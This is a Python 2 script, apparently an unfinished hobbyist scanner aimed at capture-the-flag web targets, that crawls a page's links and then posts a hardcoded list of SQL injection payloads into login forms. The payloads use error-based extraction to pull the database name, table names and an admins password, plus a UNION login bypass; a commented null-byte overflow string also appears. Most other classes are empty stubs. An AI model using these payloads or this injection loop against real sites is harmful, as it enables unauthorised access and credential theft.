#!/usr/bin/python2


import re
import requests
import time, os
from bs4 import BeautifulSoup, SoupStrainer 

RANGE_FLAG_1 = 0
RANGE_FLAG_2 =  2


exploits =  [['injections', 'overflows', 'includes', 'forgeries'],    
           ['mysql', 'xss '], 
               ['stackoverflow', 'memorycoruption'],
                   ['ssi', 'rfi'],
                   ['csrf']]

files_found = [] 
dirs_found  = []
links_tmp   = []
linkers = ''
ifparam = ''

site_ignore = []
###****IP = raw_input("enter just the sites iP or domain minus http and / after doamin ")

#IP = "35.227.24.107"
IP = "34.74.105.127" 
#url = "http://34.74.105.127/39a5d614ca/page/1"
xurl = raw_input("enter ip or domain to scan")


#url = "http://35.227.24.107/ce371a21a0/"
full_links = []
part_links = []
scraped = []
 #payload_native = "%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%ee%06%40%00%00%00%00%00"
# develop a payload generation 

headers = {'User-Agent': 'Mozilla/5.0'}
#payload = {'username':"usr ' ", 'password':"'23"}

micro_cms1 = [ "' OR (SELECT 1 from (select count(*), (concat('~',(select database()),'~',floor(rand(0)*2)))c from information_schema.tables group by c)a) AND '1' = '1 ", 
        "' OR (select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND '1' = '1 ",

       " ' OR (select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,cast(admins.password as char),0x27,0x7e) FROM 'level2'.admins LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) AND '1' = 1 ",
        




" ' UNION SELECT 'pass' AS password#    "
        

        ]



class enumerateSystem:      # enumerate the system 

    ''' i enumerate everything ''' 

    


    def enum_dirs():
         
        ''' enumerate server folders '''
        ''' if no . on the end then its a idrectory '''
        ''' we do have ../../ being used on webpages'''
        
        
    def enum_files(args):
     
        ''' enumerate server links ''' 
        
        print(''' enumerate server links \n if link is not get grab the 
                links page and parse all inputes  aka forms ''')



    def enum_misconf(args):

        ''' this will test for inadequate permissions and for any modules that are defunc'''

        print(''' this will test for inadequate permissions and for any modules that are defunc''')
     



class fuzzyPayloads:     # test and gather codes
    ''' i test the payloads '''

    def inject_payload():

        ''' this will enumerate any error or anything not whitelisted as normal '''
        print("payload injections for exploit development")

    def capture_errors():

        ''' capture and parse and store errors'''
        print("im enumerating the best exploiits to develop")

        # LOG THE ERRORS THIS NEEDS ACCESS TO THE DIRECOTREY LIST AND FILES  LIST

    


class parseData:    # parser for data enumerated
    ''' i pase the data '''

    def __init__(self, name):
        print(self)

   
    def link_enumerator(self, r, xurl):
    
   
        print("I grab the links")
    
        soup = BeautifulSoup(r.text, 'html.parser')

            





        
        for link in soup.find_all('a', href = True):
            print(link.get('href'))
            part_links.append(link.get('href'))
           
            print("im parter linker")

            print(part_links)
            
               
        
        xurl = raw_input("enter url ")        
        for i in part_links:
            
            print(xurl)
            print(i)
            dirs_found.append(xurl)

            print(xurl)
            print("dirs forund#####")
            print(dirs_found)

            raw_input("enter@@@@@@@#")
            
        for x in dirs_found:
            print("finding dirs") 
            print(x+i)
           # URL =x+i
            URL =x
            session = requests.session()

            for z in micro_cms1:
                payload = {'username':z, 'password':"pass"}

                r = requests.post(URL, headers=headers, data=payload)
                print r.cookies
            #r = requests.get(URL, headers=headers, data=payload)

                print(r.text)
                
                #print(r.json())
                print(r.status_code)
                print ("3X910iT used")
                print (z)

                

        
   
    def parse_locations(self, full_links, part_links):
       
        


        file_name = "locations.links"
        # need to see if exists then add to its own directory or later add that directly insid ethe framework 

        '''this will parse the links and directories for the testing stage to develop the code that will access the inouts ''' 
        print("Bannnnnnnnnnnnnerrrrrrrr")

   
    def parse_page_errors():
        
        ''' separate the errors and store them in necessary database structure''' 
        print(" i make the page error`s known aka page is spitting errors other than http codes" )

    def parse_server_errors():
        
        ''' parse the server for http codes'''
        print(" i let you know when you have unexpected output comming from servers ")

    def write_to_file(self, r):
        f = open('test.html','w+')
        f.write(r.text)
        f.close()
        return







class gradingSystem:    # this grading system is meant to prioritize data shown!

    ''' i grade all data gathered for the human '''



    def tech_grades():  
        
        ''' i grade the tech data '''
        print(" i help you to know the credibility of the technology data i gathered ")


    def location_grades():
        
        ''' i grade the locatons worth ''' 
        print("location grading system")


    def misconfigs():
        
        ''' grades the misconfiguration data '''

        print(" misconfigurations happen we are only human well not me")


    def injection_payloads():
       
        ''' inject payloads and get the response '''

        print("they call me loci because im mischief")


def main(xurl):
    
    url = xurl

    ''' main decisions to call classes '''
    
    
    print("Yet another main function!")
    ifparam = ''
    ''' logical processing '''
    

    get_page(xurl, ifparam)

     

def get_page(url, ifparam):
    ''' this will download the page and pass it to parsing '''
    
    print(url)
    

    if url in scraped:
        print("returning")
        return
    
    else:
        print("getpage else scraped and url ")
        print(scraped)
        print(url)
        scraped.append(url)
        print("after appendix")
        print(scraped)


        if ifparam == "": 
            print("I think your using it wrong xD  defaulting")

            print(url)
            r = requests.get(url)
            
            

            
            #parser.write_to_file(r)
            print(r.text)
            print("<<<######################>>>")
            print(url)
            print(r.status_code)
            print("##########    END OF PAGE ##################")
            raw_input("enter to procees [] .... [] ....")




            parser.link_enumerator(r, xurl)

           

def useragent(HACKER0NE):
    ''' find the hacker one agent for bughunts ''' 




#enum_sys = enumerateSystem("")  # instantiate class 
parser = parseData("")

main(xurl)


'''
ENUMERATION :   

1.0 grab main page and scan and store locations inside of the list 
check for ../ anything like that but if . at end of location then its pry a file we can also check for known mimes but sometime people like me make up file extensions; we should treat these special and safely ... 

2.0  rinse wash repeat step 1.0 until we have found no known new links on the RUN !!!!!!!!!

3.0 we need to check the file extensions and enum possible tech that could and should be tested for misconfigurations i know little on this topic / subject

4.0 if anything is needed it should be passed to parser accordingly
'''

'''
PARSING SYSTEM
1.0 parses the webpages enumerated by the first step 
2.0 parses any file folder for what its use is or modifies the data
3.0 tosses everything back to where it was before to be processed 

'''


'''
GRADING SYSTEM 

1.0 this system will grade things with a reward or spanking inside of a data base for grading

2.0 toss back to where it come from or maybe to injections class 

x.n this grading system maybe should implement AI 

'''
'''
Injections and testing 
1.0  after we have our files and directories and our grading system we will continue to inject code into the attack or possible attack vectors

2.0 we will either toss to parser or we can define a class for selection of exploits but at first we just politely use the human to enum best exploit types then we try them all ;;; later versions should be choosey and add more enumerations
'''

''' future ::: include relative list of methods like get put and post etc etc there are lots put may just be something i made up x-D'''


